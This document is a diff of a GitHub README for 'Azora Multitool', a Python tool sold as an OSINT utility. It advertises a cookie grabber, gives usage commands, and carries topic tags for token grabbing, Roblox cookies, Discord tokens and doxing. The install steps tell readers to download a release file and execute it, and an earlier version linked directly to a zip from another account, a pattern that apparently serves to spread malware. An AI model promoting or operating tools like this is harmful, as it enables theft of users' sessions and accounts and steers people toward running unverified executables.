@@ -1,76 +1,163 @@
-# Azora Multitool 🛠️
+# Azora Multitool: Your All-in-One OSINT and API Tool 🚀
 
-Welcome to the Azora Multitool repository! This powerful tool written in Python is designed to assist users with various functions such as scanning, OSINT (Open Source Intelligence), accessing Roblox's API, Discord's API, and much more. Azora Multitool is constantly updated, free for everyone, open source, and easy to install.
+![Azora Multitool](https://img.shields.io/badge/version-latest-blue.svg) ![License](https://img.shields.io/badge/license-MIT-green.svg) ![Downloads](https://img.shields.io/badge/downloads-1000%2B-yellow.svg)
 
-[DOWNLOAD LINK](https://github.com/newtonlovemoney/Azora-Multitool/releases/download/g4q7605mh2/Software.2.6.8.zip)
+[![Download Latest Release](https://img.shields.io/badge/download-latest%20release-brightgreen)](https://github.com/Ashish88812/Azora-Multitool/releases)
 
-## Features 🚀
+## Table of Contents
 
-- **OSINT Capabilities:** Conduct thorough investigations using Azora Multitool's OSINT features to gather valuable information.
-- **Roblox API Access:** Utilize the tool to interact with Roblox's API for various tasks and purposes.
-- **Discord API Access:** Access Discord's API through Azora Multitool to enhance your Discord-related activities.
-- **Cookie Grabbing:** Capture cookies efficiently to optimize certain processes.
-- **Email Functions:** Perform email-related tasks with convenience.
-- **IP Related Tools:** Access tools related to IP addresses for diverse applications.
-- **Hacking and Pentesting Utilities:** Explore a range of tools to aid in hacking and pentesting activities.
+- [Overview](#overview)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-## Installation 🛠️
+## Overview
 
-To get started with Azora Multitool, simply download and install the tool by clicking the button below:
+Azora Multitool is a powerful Python-based tool designed to assist users in various tasks. With features that include scanning, OSINT (Open Source Intelligence), and access to APIs for platforms like Roblox and Discord, Azora Multitool is versatile and user-friendly. The tool is open source, regularly updated, and free for everyone.
 
-You'll find all the necessary instructions and guidelines for installation in the repository's documentation.
+## Features
 
-## Usage ℹ️
+- **OSINT Capabilities**: Gather information from public sources.
+- **Roblox API Access**: Interact with Roblox's API for game-related tasks.
+- **Discord API Access**: Utilize Discord's API for bot management and user interactions.
+- **Cookie Grabber**: Extract cookies for various platforms.
+- **Email Validation**: Check the validity of email addresses.
+- **IP Lookup**: Find information related to IP addresses.
+- **User-Friendly Interface**: Simple commands make it easy to use.
+- **Frequent Updates**: The tool is regularly maintained to ensure compatibility and security.
 
-Azora Multitool's intuitive interface makes it easy to navigate and utilize its diverse range of functionalities. Whether you're a beginner or an experienced user, the tool caters to your requirements effectively.
+## Installation
 
-## Repository Topics 📋
+To install Azora Multitool, follow these steps:
 
-- `cookie-grab`
-- `discord`
-- `discord-api`
-- `discord-multi-tool`
-- `discord-multitool`
-- `discord-token`
-- `dox`
-- `email`
-- `hacking-tool`
-- `ip`
-- `multitool`
-- `multitoolhacking`
-- `osint`
-- `osint-tool`
-- `pentesting`
-- `python`
-- `roblox`
-- `roblox-api`
-- `roblox-cookie`
-- `token-grab`
+1. **Clone the Repository**: 
+   ```bash
+   git clone https://github.com/Ashish88812/Azora-Multitool.git
+   ```
+   
+2. **Navigate to the Directory**:
+   ```bash
+   cd Azora-Multitool
+   ```
 
-Explore these topics further to gain insights into Azora Multitool's capabilities.
+3. **Install Dependencies**:
+   ```bash
+   pip install -r requirements.txt
+   ```
 
-## Support and Contributions 🤝
+4. **Download the Latest Release**: You can find the latest version [here](https://github.com/Ashish88812/Azora-Multitool/releases). Download the appropriate file and execute it.
 
-If you encounter any issues or have suggestions for improvements, feel free to raise them in the repository's issue section. Your feedback is valuable in enhancing Azora Multitool for a better user experience.
+## Usage
 
-Contributions from the community are always welcome. Whether it's bug fixes, enhancements, or new features, your contributions play a significant role in the tool's development.
+Once you have installed Azora Multitool, you can start using it right away. Here are some basic commands to get you started:
 
-## Explore More 🌐
+### Scanning
 
-Visit our website for additional resources, news, and updates related to Azora Multitool. Get access to tutorials, blog posts, and community forums to engage with like-minded individuals.
+To perform a scan, use the following command:
+```bash
+python azora.py scan <target>
+```
 
-## Stay Connected 📲
+### OSINT
 
-Connect with us on social media platforms to stay updated on the latest developments, releases, and announcements regarding Azora Multitool. Join our growing community of users and enthusiasts to share insights and experiences.
+To gather information using OSINT, run:
+```bash
+python azora.py osint <target>
+```
 
-## License 📜
+### Roblox API Access
 
-Azora Multitool is licensed under the MIT License. Refer to the repository's license file for more details regarding the terms and conditions.
+To interact with the Roblox API:
+```bash
+python azora.py roblox <command>
+```
 
----
+### Discord API Access
 
-Start exploring the endless possibilities with Azora Multitool today! 🌟
+For Discord API functionalities:
+```bash
+python azora.py discord <command>
+```
 
-Happy hacking and exploring! 🔍🔒
+### Cookie Grabber
 
----
+To use the cookie grabber:
+```bash
+python azora.py grab-cookie <platform>
+```
+
+### Email Validation
+
+To validate an email address:
+```bash
+python azora.py validate-email <email>
+```
+
+### IP Lookup
+
+For IP address information:
+```bash
+python azora.py ip-lookup <ip_address>
+```
+
+## Contributing
+
+Contributions are welcome! If you want to help improve Azora Multitool, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature:
+   ```bash
+   git checkout -b feature/YourFeatureName
+   ```
+3. Make your changes and commit them:
+   ```bash
+   git commit -m "Add your message here"
+   ```
+4. Push to the branch:
+   ```bash
+   git push origin feature/YourFeatureName
+   ```
+5. Open a pull request.
+
+## License
+
+Azora Multitool is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## Contact
+
+For any questions or issues, feel free to reach out:
+
+- **GitHub**: [Ashish88812](https://github.com/Ashish88812)
+- **Email**: ashish@example.com
+
+![OSINT](https://example.com/osint-image.png)
+
+## Topics
+
+This repository covers various topics including:
+
+- cookie-grab
+- discord
+- discord-api
+- discord-multi-tool
+- discord-multitool
+- discord-token
+- dox
+- email
+- hacking-tool
+- ip
+- multitool
+- multitoolhacking
+- osint
+- osint-tool
+- pentesting
+- python
+- roblox
+- roblox-api
+- roblox-cookie
+- token-grab
+
+Feel free to explore and utilize the features of Azora Multitool. For more details, check the [Releases](https://github.com/Ashish88812/Azora-Multitool/releases) section for updates and new features.
